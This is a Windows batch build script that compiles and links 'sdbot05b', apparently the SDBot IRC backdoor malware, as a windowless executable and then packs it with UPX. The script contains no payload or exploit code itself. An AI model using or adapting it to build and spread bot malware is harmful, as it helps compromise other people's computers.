@echo off

:: ================================================== ::
:: change 'c:\lcc' to the location of your lcc folder ::
:: ================================================== ::
set lccdir=c:\lcc
                              
echo compiling...
%lccdir%\bin\lcc -O -unused sdbot05b.c 
%lccdir%\bin\lcc -O -unused md5sum.c 
%lccdir%\bin\lcc -O -unused md5.c
echo linking...
%lccdir%\bin\lcclnk -subsystem windows -s sdbot05b.obj md5sum.obj md5.obj ws2_32.lib wininet.lib shell32.lib icmp.lib winmm.lib
echo done.
echo.
del *.obj
tools\upx -9 sdbot05b.exe
dir sdbot*.exe
echo.
pause
